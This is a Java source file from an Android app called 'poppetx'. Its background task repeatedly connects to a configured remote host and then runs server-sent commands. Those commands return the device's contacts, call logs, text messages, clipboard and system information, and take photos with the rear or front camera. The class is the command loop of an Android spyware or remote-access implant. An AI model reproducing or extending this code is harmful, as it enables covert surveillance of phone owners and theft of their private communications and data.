 package com.poppet.poppetx;

import android.app.Activity;
import android.content.Context;
import android.hardware.Camera;
import android.os.AsyncTask;
import android.util.Log;

import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.InetSocketAddress;
import java.net.Socket;

public class socketWork extends AsyncTask<Void, Void, Void> {
    Activity activity;
    Context context;

    public socketWork(Activity activity, Context applicationContext) {
        this.activity = activity;
        this.context = applicationContext;
    }

    @Override
    protected Void doInBackground(Void... voids) {
        Socket socket = null;
        //Connection Part
        do {
            try {
                socket = new Socket();
                socket.connect(new InetSocketAddress(NetworkConfig.HOST_ADDRESS, NetworkConfig.PORT_NO), 5000);
            } catch (Exception exception) {
                exception.printStackTrace();
            }

        } while (!socket.isConnected());
        //Input Output Part
        try {
            OutputStream out = new DataOutputStream(socket.getOutputStream());
            BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));
            String inputFromServer;
            out.write("Server test success".getBytes());
            while ((inputFromServer = in.readLine()) != null) {
                Log.d("POPPET", inputFromServer);
                switch (inputFromServer) {
                    case "end":
                        socket.close();
                        break;
                    case "getContacts":
                        //TODO Handle the getContacts Runtime Permission check on android which crashes the thing
                        out.write(modules.getContactNumbers(context).getBytes("UTF-8"));
                        break;
                    case "getCallLogs":
                        out.write(modules.getCallLogs(context).getBytes("UTF-8"));
                        break;
                    case "getSystemInfo":
                        Log.d("POPPET", "Starting the function");
                        out.write(modules.getSystemInfo().getBytes("UTF-8"));
                        break;
                    case "getMessages":
                        out.write(modules.getMessages(context).getBytes("UTF-8"));
                        break;
                    case "getClipBoardContent":
                        //TODO Patch nullPointerException
                        out.write(modules.getClipBoardContent(activity).getBytes("UTF-8"));
                        break;
                    case "takePhoto":
                        out.write(modules.takePhoto(Camera.CameraInfo.CAMERA_FACING_BACK , context, out).getBytes("UTF-8"));
                        break;
                    case "takeSelfie":
                        out.write(modules.takePhoto(Camera.CameraInfo.CAMERA_FACING_FRONT, context, out).getBytes("UTF-8"));
                        break;
                    default:
                        String badStuff = "Unable to understand you!";
                        out.write(badStuff.getBytes("UTF-8"));
                        break;
                }
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
        return null;
    }
}
